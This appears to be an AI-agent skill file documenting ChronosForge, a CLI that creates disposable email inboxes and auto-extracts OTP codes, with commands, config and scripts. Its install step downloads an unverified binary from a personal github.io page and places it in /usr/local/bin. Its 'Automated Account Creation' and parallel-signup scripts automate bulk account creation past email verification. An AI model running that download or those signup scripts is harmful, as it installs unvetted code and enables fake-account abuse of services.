---
name: chronosforge-temporal-email-cli
description: Generate temporary email inboxes and auto-extract OTP codes for verification workflows
triggers:
  - create a temporary email address
  - extract OTP code from email
  - monitor inbox for verification codes
  - generate disposable email for testing
  - watch for authentication codes in email
  - set up temporary inbox with auto-extraction
  - automate email verification code retrieval
  - create ephemeral email for account signup
---

# ChronosForge Temporal Email CLI

> Skill by [ara.so](https://ara.so) — Devtools Skills collection.

ChronosForge (inbox-watcher-cli) is a temporal credential management platform for generating disposable email addresses, monitoring inboxes in real-time, and automatically extracting OTP/verification codes. Built for testing authentication flows, automation pipelines, and secure verification workflows.

## Installation

Download the latest release from the official distribution:

```bash
# Visit the download page
open https://randyfajar.github.io/inbox-watcher-cli/

# Or use wget/curl if direct binary URL is available
wget https://randyfajar.github.io/inbox-watcher-cli/chronosforge-latest
chmod +x chronosforge-latest
mv chronosforge-latest /usr/local/bin/chronosforge
```

Verify installation:

```bash
chronosforge --version
chronosforge status
```

## Core Concepts

### Temporal Inbox Lifecycle

1. **Request Phase** - Generate inbox with TTL and domain preferences
2. **Lifecycle Phase** - Inbox exists and receives emails
3. **Extraction Phase** - ACE (Atomic Code Extractor) identifies and extracts OTP codes
4. **Consumption Phase** - Application uses extracted code
5. **Disposal Phase** - Inbox self-destructs after TTL expires

### Modes of Operation

- **CLI Mode** - Command-line automation and scripting
- **TUI Mode** - Terminal dashboard for visual monitoring
- **REST API Mode** - Background daemon for system integration

## CLI Commands

### Generate Temporary Inbox

```bash
# Create inbox with default settings (10 minute TTL)
chronosforge inbox create

# Custom domain and TTL
chronosforge inbox create --domain tempmail.org --ttl 30m --prefix testuser

# Generate multiple inboxes
chronosforge inbox create --count 5 --output inboxes.json

# With custom expiration
chronosforge inbox create --ttl 2h --format json
```

### Monitor Inbox

```bash
# Watch inbox for incoming messages
chronosforge inbox watch <inbox_id>

# Watch with auto-extraction enabled
chronosforge inbox watch <inbox_id> --auto-extract

# Filter messages by sender
chronosforge inbox watch <inbox_id> --filter "noreply@example.com"

# Silent mode (output only extracted codes)
chronosforge inbox watch <inbox_id> --silent --extract-only
```

### Extract OTP Codes

```bash
# Extract from latest message
chronosforge extract <inbox_id>

# Extract from specific message
chronosforge extract <inbox_id> --message-id <msg_id>

# Extract with custom pattern
chronosforge extract <inbox_id> --pattern '\d{6}'

# Extract and output to stdout
chronosforge extract <inbox_id> --stdout
```

### List Available Domains

```bash
# Show all generation domains
chronosforge domains list

# Show domains with reputation scores
chronosforge domains list --with-reputation

# Filter high-reputation domains only
chronosforge domains list --min-reputation 80
```

### Inbox Management

```bash
# List active inboxes
chronosforge inbox list

# Get inbox details
chronosforge inbox info <inbox_id>

# Delete inbox manually
chronosforge inbox delete <inbox_id>

# Export inbox messages
chronosforge inbox export <inbox_id> --output messages.json
```

## TUI (Terminal User Interface)

Launch interactive dashboard:

```bash
# Start TUI mode
chronosforge tui

# TUI with specific inbox pre-loaded
chronosforge tui --inbox <inbox_id>

# TUI monitoring multiple inboxes
chronosforge tui --watch inbox1,inbox2,inbox3
```

### TUI Keyboard Shortcuts

- `n` - Create new inbox
- `w` - Watch selected inbox
- `e` - Extract OTP from selected message
- `d` - Delete selected inbox
- `r` - Refresh inbox list
- `q` - Quit
- `↑/↓` - Navigate list
- `Enter` - View message details

## REST API Mode

Start daemon server:

```bash
# Start API server on default port (8080)
chronosforge server start

# Custom port and bind address
chronosforge server start --port 3000 --bind 0.0.0.0

# With API key authentication
chronosforge server start --api-key $CHRONOSFORGE_API_KEY

# Background daemon mode
chronosforge server start --daemon
```

### API Endpoints

**Create Inbox**
```bash
curl -X POST http://localhost:8080/api/v1/inbox \
  -H "Content-Type: application/json" \
  -d '{
    "domain": "tempmail.org",
    "ttl": "30m",
    "prefix": "testuser"
  }'
```

**Get Inbox Messages**
```bash
curl http://localhost:8080/api/v1/inbox/<inbox_id>/messages
```

**Extract OTP**
```bash
curl -X POST http://localhost:8080/api/v1/inbox/<inbox_id>/extract
```

**List Domains**
```bash
curl http://localhost:8080/api/v1/domains
```

**Health Check**
```bash
curl http://localhost:8080/api/v1/status
```

## Configuration

### Configuration File

Create `~/.chronosforge/config.yaml`:

```yaml
# Default domain preferences
domains:
  preferred:
    - tempmail.org
    - guerrillamail.com
    - 10minutemail.com
  min_reputation: 70

# Default TTL for inboxes
default_ttl: 10m

# Extraction settings
extraction:
  auto_extract: true
  patterns:
    - name: "numeric_6digit"
      pattern: '\b\d{6}\b'
    - name: "alphanumeric_8char"
      pattern: '[A-Z0-9]{8}'
  
# API server settings
server:
  port: 8080
  bind: "127.0.0.1"
  api_key_env: "CHRONOSFORGE_API_KEY"

# Rate limiting
rate_limit:
  inbox_creation_per_hour: 100
  extraction_per_hour: 1000
  burst_capacity: 20

# Logging
logging:
  level: "info"
  file: "~/.chronosforge/chronosforge.log"
  format: "json"
```

### Custom Extraction Rules

Create `~/.chronosforge/extraction_rules.json`:

```json
{
  "rules": [
    {
      "service": "GitHub",
      "sender_patterns": ["noreply@github.com"],
      "subject_patterns": ["verification code", "confirm your email"],
      "code_pattern": "\\b\\d{6}\\b",
      "code_type": "numeric"
    },
    {
      "service": "AWS",
      "sender_patterns": ["no-reply@.*\\.amazonaws\\.com"],
      "subject_patterns": ["verification code"],
      "code_pattern": "\\b[A-Z0-9]{6}\\b",
      "code_type": "alphanumeric"
    },
    {
      "service": "Generic Magic Link",
      "sender_patterns": [".*"],
      "body_patterns": ["https?://[^\\s]+/verify/[^\\s]+"],
      "code_pattern": "https?://[^\\s]+/verify/[^\\s]+",
      "code_type": "url"
    }
  ]
}
```

### Environment Variables

```bash
# API authentication
export CHRONOSFORGE_API_KEY="your-api-key-here"

# Custom config location
export CHRONOSFORGE_CONFIG="$HOME/.config/chronosforge/config.yaml"

# Enable debug logging
export CHRONOSFORGE_LOG_LEVEL="debug"

# Default domain override
export CHRONOSFORGE_DEFAULT_DOMAIN="tempmail.org"
```

## Automation Examples

### CI/CD Pipeline Integration

```bash
#!/bin/bash
# test-email-verification.sh

set -e

# Create temporary inbox
INBOX_JSON=$(chronosforge inbox create --format json --ttl 15m)
INBOX_ID=$(echo $INBOX_JSON | jq -r '.id')
EMAIL=$(echo $INBOX_JSON | jq -r '.email')

echo "Created inbox: $EMAIL (ID: $INBOX_ID)"

# Trigger signup flow with temporary email
curl -X POST https://api.yourservice.com/signup \
  -d "email=$EMAIL&username=testuser"

# Wait for verification email and extract code
echo "Waiting for verification code..."
CODE=$(chronosforge inbox watch $INBOX_ID --silent --extract-only --timeout 120)

if [ -z "$CODE" ]; then
  echo "Failed to extract verification code"
  exit 1
fi

echo "Extracted code: $CODE"

# Complete verification
curl -X POST https://api.yourservice.com/verify \
  -d "email=$EMAIL&code=$CODE"

# Cleanup
chronosforge inbox delete $INBOX_ID
```

### Multi-Factor Authentication Testing

```bash
#!/bin/bash
# test-mfa-flow.sh

INBOXES=()

# Generate 10 test inboxes
for i in {1..10}; do
  INBOX=$(chronosforge inbox create --format json --prefix "mfa-test-$i")
  INBOX_ID=$(echo $INBOX | jq -r '.id')
  INBOXES+=($INBOX_ID)
  
  echo "Created inbox $i: $(echo $INBOX | jq -r '.email')"
done

# Monitor all inboxes simultaneously
chronosforge tui --watch $(IFS=,; echo "${INBOXES[*]}")

# Cleanup after test
for inbox_id in "${INBOXES[@]}"; do
  chronosforge inbox delete $inbox_id
done
```

### Python Integration via API

```python
import requests
import time
import os

CHRONOSFORGE_API = os.getenv("CHRONOSFORGE_API_URL", "http://localhost:8080/api/v1")
API_KEY = os.getenv("CHRONOSFORGE_API_KEY")

headers = {"X-API-Key": API_KEY} if API_KEY else {}

def create_inbox(ttl="10m", domain=None):
    """Create temporary inbox"""
    payload = {"ttl": ttl}
    if domain:
        payload["domain"] = domain
    
    response = requests.post(
        f"{CHRONOSFORGE_API}/inbox",
        json=payload,
        headers=headers
    )
    response.raise_for_status()
    return response.json()

def wait_for_code(inbox_id, timeout=120, poll_interval=5):
    """Poll inbox until OTP code is extracted"""
    start_time = time.time()
    
    while time.time() - start_time < timeout:
        # Trigger extraction
        response = requests.post(
            f"{CHRONOSFORGE_API}/inbox/{inbox_id}/extract",
            headers=headers
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get("code"):
                return data["code"]
        
        time.sleep(poll_interval)
    
    raise TimeoutError("No verification code received within timeout")

def test_email_verification():
    """Complete email verification flow"""
    # Create inbox
    inbox = create_inbox(ttl="15m")
    email = inbox["email"]
    inbox_id = inbox["id"]
    
    print(f"Using temporary email: {email}")
    
    # Trigger signup (replace with your service)
    requests.post("https://api.example.com/signup", json={"email": email})
    
    # Wait for verification code
    print("Waiting for verification code...")
    code = wait_for_code(inbox_id, timeout=120)
    print(f"Extracted code: {code}")
    
    # Complete verification
    requests.post("https://api.example.com/verify", json={
        "email": email,
        "code": code
    })
    
    print("Verification complete!")

if __name__ == "__main__":
    test_email_verification()
```

### Node.js Integration

```javascript
const axios = require('axios');

const CHRONOSFORGE_API = process.env.CHRONOSFORGE_API_URL || 'http://localhost:8080/api/v1';
const API_KEY = process.env.CHRONOSFORGE_API_KEY;

const headers = API_KEY ? { 'X-API-Key': API_KEY } : {};

async function createInbox({ ttl = '10m', domain = null } = {}) {
  const payload = { ttl };
  if (domain) payload.domain = domain;
  
  const response = await axios.post(`${CHRONOSFORGE_API}/inbox`, payload, { headers });
  return response.data;
}

async function waitForCode(inboxId, { timeout = 120000, pollInterval = 5000 } = {}) {
  const startTime = Date.now();
  
  while (Date.now() - startTime < timeout) {
    try {
      const response = await axios.post(
        `${CHRONOSFORGE_API}/inbox/${inboxId}/extract`,
        {},
        { headers }
      );
      
      if (response.data.code) {
        return response.data.code;
      }
    } catch (error) {
      // Continue polling on errors
    }
    
    await new Promise(resolve => setTimeout(resolve, pollInterval));
  }
  
  throw new Error('No verification code received within timeout');
}

async function testEmailVerification() {
  // Create inbox
  const inbox = await createInbox({ ttl: '15m' });
  console.log(`Using temporary email: ${inbox.email}`);
  
  // Trigger signup
  await axios.post('https://api.example.com/signup', {
    email: inbox.email
  });
  
  // Wait for code
  console.log('Waiting for verification code...');
  const code = await waitForCode(inbox.id);
  console.log(`Extracted code: ${code}`);
  
  // Verify
  await axios.post('https://api.example.com/verify', {
    email: inbox.email,
    code: code
  });
  
  console.log('Verification complete!');
}

testEmailVerification().catch(console.error);
```

## Common Patterns

### Pattern 1: Automated Account Creation

```bash
# Create inbox, signup, extract code, verify
create_and_verify_account() {
  local SERVICE_URL=$1
  local USERNAME=$2
  
  # Generate inbox
  INBOX=$(chronosforge inbox create --format json --ttl 20m)
  EMAIL=$(echo $INBOX | jq -r '.email')
  INBOX_ID=$(echo $INBOX | jq -r '.id')
  
  # Start watching in background
  chronosforge inbox watch $INBOX_ID --auto-extract --silent > /tmp/code_$INBOX_ID &
  WATCH_PID=$!
  
  # Trigger signup
  curl -X POST "$SERVICE_URL/signup" -d "email=$EMAIL&username=$USERNAME"
  
  # Wait for code extraction
  sleep 10
  CODE=$(cat /tmp/code_$INBOX_ID)
  
  # Verify account
  curl -X POST "$SERVICE_URL/verify" -d "email=$EMAIL&code=$CODE"
  
  # Cleanup
  kill $WATCH_PID 2>/dev/null
  rm /tmp/code_$INBOX_ID
  chronosforge inbox delete $INBOX_ID
  
  echo "Account created and verified: $EMAIL"
}
```

### Pattern 2: Parallel Testing

```bash
# Test multiple services simultaneously
parallel_test() {
  local SERVICES=("service1.com" "service2.com" "service3.com")
  
  for service in "${SERVICES[@]}"; do
    (
      INBOX=$(chronosforge inbox create --format json)
      EMAIL=$(echo $INBOX | jq -r '.email')
      INBOX_ID=$(echo $INBOX | jq -r '.id')
      
      # Test flow
      curl -X POST "https://$service/signup" -d "email=$EMAIL"
      CODE=$(chronosforge inbox watch $INBOX_ID --silent --extract-only --timeout 60)
      
      if [ ! -z "$CODE" ]; then
        echo "$service: SUCCESS (code: $CODE)"
      else
        echo "$service: FAILED (no code received)"
      fi
      
      chronosforge inbox delete $INBOX_ID
    ) &
  done
  
  wait
}
```

### Pattern 3: Scheduled Monitoring

```bash
# Monitor inbox for specific time period
monitor_with_timeout() {
  local DURATION=$1  # in seconds
  
  INBOX=$(chronosforge inbox create --format json --ttl "${DURATION}s")
  INBOX_ID=$(echo $INBOX | jq -r '.id')
  EMAIL=$(echo $INBOX | jq -r '.email')
  
  echo "Monitoring $EMAIL for ${DURATION}s"
  
  timeout $DURATION chronosforge inbox watch $INBOX_ID --auto-extract \
    | while read line; do
        echo "[$(date)] $line"
      done
}
```

## Troubleshooting

### Inbox Creation Fails

```bash
# Check available domains
chronosforge domains list --with-reputation

# Try specific domain
chronosforge inbox create --domain guerrillamail.com

# Check rate limits
chronosforge status
```

### Code Extraction Not Working

```bash
# View raw messages to debug extraction
chronosforge inbox info <inbox_id> --show-messages

# Use custom pattern
chronosforge extract <inbox_id> --pattern '\b[A-Z0-9]{6}\b' --verbose

# Check extraction rules
cat ~/.chronosforge/extraction_rules.json

# Enable debug logging
CHRONOSFORGE_LOG_LEVEL=debug chronosforge extract <inbox_id>
```

### API Server Issues

```bash
# Check server status
chronosforge server status

# View server logs
tail -f ~/.chronosforge/chronosforge.log

# Restart server with debug
chronosforge server stop
CHRONOSFORGE_LOG_LEVEL=debug chronosforge server start

# Test connectivity
curl http://localhost:8080/api/v1/status
```

### TUI Display Problems

```bash
# Reset terminal
reset

# Check terminal size
echo $COLUMNS $LINES

# Use compact mode for small terminals
chronosforge tui --compact

# Disable colors
chronosforge tui --no-color
```

### Inbox Not Receiving Messages

```bash
# Verify inbox is active
chronosforge inbox info <inbox_id>

# Check domain reputation
chronosforge domains list --domain <domain_name>

# Try different domain
chronosforge inbox create --domain 10minutemail.com

# Increase TTL
chronosforge inbox create --ttl 30m
```

## Security Considerations

- **Never hardcode API keys** - Use environment variables
- **Auto-deletion** - Inboxes self-destruct after TTL expires
- **Isolated storage** - No cross-inbox data leakage
- **Local extraction** - OTP codes never transmitted externally
- **Audit logging** - All actions are logged for forensics
- **Rate limiting** - Built-in protection against abuse

## Best Practices

1. **Set appropriate TTL** - Match inbox lifetime to expected workflow duration
2. **Use high-reputation domains** - Reduces risk of email rejection
3. **Enable auto-extraction** - Reduces manual intervention
4. **Monitor rate limits** - Stay within API quotas
5. **Clean up inboxes** - Delete manually if workflow completes early
6. **Use custom patterns** - Define service-specific extraction rules
7. **Test extraction rules** - Verify patterns match actual email formats
8. **Run API in daemon mode** - For production integration workflows
